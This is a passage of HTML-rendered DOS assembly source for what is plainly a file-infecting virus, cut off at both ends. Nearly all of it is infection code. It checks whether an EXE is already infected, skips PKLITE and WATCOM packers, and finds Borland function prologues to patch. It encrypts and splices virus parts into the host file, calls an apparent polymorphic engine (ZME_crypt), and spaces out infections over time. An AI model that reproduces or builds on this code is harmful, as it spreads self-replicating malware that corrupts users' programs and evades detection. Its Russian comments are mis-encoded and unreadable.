        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">arx_crc.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Ä[generate name]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;$BEEP$</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_Three_Bits</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._fnamestr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc5">DO</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">   </span><span class="sc1">; ('Z'-'A')</span><span class="sc0">
            </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0">
        </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">pos98.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÅÄÄ[process EXE/SFX]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_exe</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_pages</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_len_mod_512</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">ExactPage</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ExactPage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosSeek</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_tst</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">offs</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">
</span><span class="sc1">;ÄÅÄÄ[process EXE]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
            </span><span class="sc1">;newexetest</span><span class="sc0">
</span><span class="sc1">;            probability_test prblt_infct_EXE, 0f0h, error_exit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; INFECT exe</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">seek_end</span><span class="sc0">
</span><span class="sc1">;§¤¥áì ®âá¥ïâì ¬ «¥­ìª¨¥ ä ©«ë</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MININFECTSIZE</span><span class="sc4">/</span><span class="sc2">100H</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">          </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">
</span><span class="sc1">;................................</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">test_size</span><span class="sc0"> </span><span class="sc1">;proc;ax-(file_size and 0FFFFh)</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">dosseek_bof</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">exe_test</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">             </span><span class="sc1">;already infect</span><span class="sc0">
</span><span class="sc1">;; ­¥ § à ¦ âì EXE ä ©«ë ¡¥§ à¥«®ª¥©è¥­®¢,</span><span class="sc0">
</span><span class="sc1">;¨ ¥á«¨ à¥«®ª¥©è¥­®¢ ®ç¥­ì ¬­®£® (?)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_rle_count</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;0 or 1 relocations</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">
</span><span class="sc1">;................................</span><span class="sc0">

</span><span class="sc1">;; ¥á«¨ ¤«¨­  § £àã¦ ¥¬®© ç áâ¨ exeè­¨ª  ¡®«ìè¥ ... 32k = 40h pages</span><span class="sc0">
</span><span class="sc1">;test for pklite(etc) &amp; PASS E</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc0"> </span><span class="sc1">;PKLITE ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">;07, 20h -WATCOM</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">   </span><span class="sc1">;07, 20h -WATCOM</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_pages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">insert_exe_infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_par_dir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">standart_exe_infect2</span><span class="sc0"> </span><span class="sc1">;if header&gt;64k</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cx_0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1800h</span><span class="sc0"> </span><span class="sc1">;6k</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosRead</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;scan</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">    </span><span class="sc1">;&lt;add si,3</span><span class="sc0">
            </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;push bp; mov bp,sp ;&lt; BORLAND</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exfnd</span><span class="sc0">
            </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;push bp; mov bp,sp ;&lt; BORLAND</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exfnd</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cont_search</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">standart_exe_infect2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">standart_exe_infect</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">exfnd</span><span class="sc0">
</span><span class="sc5">sizeof_part1</span><span class="sc4">=</span><span class="sc2">54h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_part1</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;            jz      nff</span><span class="sc0">
            </span><span class="sc1">;nff:</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cont_search</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc1">;$BEEP$</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ffsize_lo</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ffsize_hi</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ffsize_lo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ffsize_hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_par_dir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">)+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cx_0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc5">sizeof_part2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; to heap+sizeof(part2)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_part1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosRead</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
            </span><span class="sc1">;§¤¥áì part 1</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">part2</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;¢ë¡®à ªà¨¯â®¢é¨ª  ¤«ï part2 (?)</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">crypt_part2</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">crypt_part2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">crypt_old1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_part1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_end</span><span class="sc0">
</span><span class="sc5">sizeof_part2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
</span><span class="sc1">;«ãçè¥ çâ®-â® ¢à®¤¥:</span><span class="sc0">
</span><span class="sc1">; part2 -&gt; heap</span><span class="sc0">
</span><span class="sc1">; encode virus to heap+sizeof(part1)+sizeof(part2)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc5">sizeof_part1</span><span class="sc4">+</span><span class="sc5">sizeof_part2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zmeflIXE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ZME_crypt</span><span class="sc0"> </span><span class="sc1">;;ret CX-SIZE</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ffentrvir</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">crypt_old1</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ffentrvir</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_part2</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">crypt_part2</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_part1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">crypt_old1</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc1">; crypt part2</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">sizeof_part1</span><span class="sc4">+</span><span class="sc5">sizeof_part2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_sizemarker</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">error_exit_2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">endd</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0CBh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0CFh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">09Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0CAh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0C2h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">no_freq_proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_cur_time</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">last_infect_time</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INTERVAL_INFECT</span><span class="sc0"> </span><span class="sc1">;0.5 ¬¨­</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">RELIZ</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">error_exit_2</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;        ret</span><span class="sc0">

</span><span class="sc1">;    DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">standart_exe_infect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">seek_end</span><span class="sc0">   </span><span class="sc1">;dx:ax - file size</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">endd</span><span class="sc0">       </span><span class="sc1">;­¥ § à ¦ âì EXEä ©«ë á ­¥ç¥â­®© ¤«¨­®©</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">;6*64k=384k 4*64k=256k</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">       </span><span class="sc5">endd</span><span class="sc0">       </span><span class="sc1">;file too big, infect him other method (?)</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; INFECT</span><span class="sc0">
